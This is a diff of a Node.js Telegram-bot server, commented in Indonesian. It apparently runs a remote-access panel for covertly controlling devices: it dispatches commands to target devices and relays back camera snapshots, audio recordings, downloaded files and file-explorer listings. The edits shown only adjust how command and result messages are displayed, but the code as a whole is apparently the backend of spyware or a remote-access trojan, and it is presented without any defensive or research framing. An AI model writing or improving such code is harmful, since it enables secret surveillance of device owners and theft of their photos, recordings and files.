@@ -102,7 +102,7 @@ app.use('/public', express.static(path.join(__dirname, 'public')));
 const updateDeviceSeen = async (deviceId, mode = 'normal', ipv6 = null) => {
     const timestamp = Date.now() / 1000;
     const finalMode = (mode === 'short' || mode === 'turbo') ? 'turbo' : 'normal';
-    
+
     if (ipv6) {
         await db.run('INSERT INTO devices (id, last_seen, polling_mode, ipv6) VALUES (?, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode, ipv6=excluded.ipv6',
             [deviceId, timestamp, finalMode, ipv6]);
@@ -457,9 +457,18 @@ Format Eksekusi Manual:
             );
         }
 
-        const isResult = ctx.callbackQuery.message.text && (ctx.callbackQuery.message.text.includes('Respon') || ctx.callbackQuery.message.text.includes('Data'));
-        const rawText = isResult ? ctx.callbackQuery.message.text.replace('⏳ Menunggu Respon...', '') : '';
-        const caption = isResult ? escapeHTML(rawText) : `🎯 <b>Menu ${isSecret ? 'Lanjutan' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
+        const rawText = ctx.callbackQuery?.message?.text || '';
+        const isResult = rawText && (
+            rawText.includes('Respon') ||
+            rawText.includes('Data') ||
+            rawText.includes('Berhasil') ||
+            rawText.includes('Jepretan') ||
+            rawText.includes('Rekaman') ||
+            rawText.includes('Hasil')
+        );
+
+        const greeting = `🎯 <b>Menu ${isSecret ? 'Lanjutan' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
+        const caption = isResult ? `${escapeHTML(rawText.split('🎯 Menu')[0].replace('⏳ Menunggu Respon...', '').trim())}\n\n${greeting}` : greeting;
 
         menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
         const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };
@@ -525,7 +534,32 @@ Format Eksekusi Manual:
 
         const cmdId = uuidv4().slice(0, 8);
         const chatId = ctx.callbackQuery.message.chat.id.toString();
-        const messageId = ctx.callbackQuery.message.message_id.toString();
+        let messageId = ctx.callbackQuery.message.message_id.toString();
+
+        const oldText = ctx.callbackQuery?.message?.text || '';
+        const wasResult = oldText && (
+            oldText.includes('Respon') ||
+            oldText.includes('Data') ||
+            oldText.includes('Berhasil') ||
+            oldText.includes('Jepretan') ||
+            oldText.includes('Rekaman') ||
+            oldText.includes('Hasil')
+        );
+
+        // Mencegah Spam, kita gunakan editMessageText JIKA tidak ada hasil sebelumnya (Mode App).
+        // Jika ada hasil (misal Lokasi), kita kirim pesan BARU agar riwayat Lokasi/Hasil tidak hilang (tertimpa).
+        try {
+            if (wasResult) {
+                // Jangan biarkan tombol menu di message lama aktif agar tidak ambigu
+                ctx.editMessageReplyMarkup().catch(() => { });
+                const sentMsg = await ctx.reply(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
+                messageId = sentMsg.message_id.toString();
+            } else {
+                await ctx.editMessageText(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
+            }
+        } catch (e) {
+            // Jika konten sama, Telegraf lempar error: abaikan
+        }
 
         const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
         const currentMode = device?.polling_mode || 'normal';
@@ -534,13 +568,6 @@ Format Eksekusi Manual:
 
         // Beritahu client jika sedang menunggu long-polling
         notifyClient(devId, { id: cmdId, command: realCmdName, text: cmdText });
-
-        // Mencegah Spam, kita gunakan editMessageText
-        try {
-            await ctx.editMessageText(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
-        } catch (e) {
-            // Jika gagal edit (misal konten sama), abaikan saja agar tidak spam reply baru
-        }
     });
 
     bot.action(/^pagecmd:(.+):(.+)$/, async (ctx) => {
@@ -793,6 +820,7 @@ app.post('/response', async (req, res) => {
                         source: audioBuffer,
                         filename: `record_${data.id}.3gp`
                     }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
+                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
 
@@ -801,6 +829,7 @@ app.post('/response', async (req, res) => {
                     await bot.telegram.sendPhoto(cmd.chat_id, {
                         source: imageBuffer
                     }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
+                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
 
@@ -810,6 +839,7 @@ app.post('/response', async (req, res) => {
                         source: fileBuffer,
                         filename: deviceResponse.name
                     }, { caption: `✅ <b>Berhasil Mengunduh File (${escapeHTML(client_id)})</b>\n📂 Nama: ${escapeHTML(deviceResponse.name)}`, parse_mode: 'HTML', ...getNavOpts() });
+                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
 
@@ -821,7 +851,7 @@ app.post('/response', async (req, res) => {
                         page: 1,
                         totalPages: Math.max(1, Math.ceil(deviceResponse.length / 30))
                     };
-                    await sendExplorerPage(client_id, 1, cmd.chat_id);
+                    await sendExplorerPage(client_id, 1, cmd.chat_id, cmd.message_id);
                     return res.json({ status: 'received' });
                 }
 
